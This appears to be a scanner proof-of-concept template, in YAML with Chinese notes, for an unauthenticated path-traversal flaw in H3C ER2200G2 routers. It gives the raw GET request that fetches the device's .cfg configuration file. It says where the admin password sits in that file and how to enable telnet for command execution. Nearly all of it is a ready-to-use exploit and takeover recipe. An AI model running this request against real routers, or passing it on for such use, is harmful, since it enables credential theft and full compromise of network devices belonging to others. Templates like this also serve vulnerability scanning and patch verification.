id: poc-wclzkx2in4323rg0
info:
  name: H3C多系列路由器ER2200G2.cfg存在任意用户登录漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: unauth,2025
http:
- raw:
  - '访问userLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg）根据设备型号修改payload


    GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close


    密码就在<font style="color:rgba(0, 0, 0, 0.9);">vtypasswd</font>字段


    账户为admin


    可在远程管理->远程telnet管理处开启telnet获取命令执行权限'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
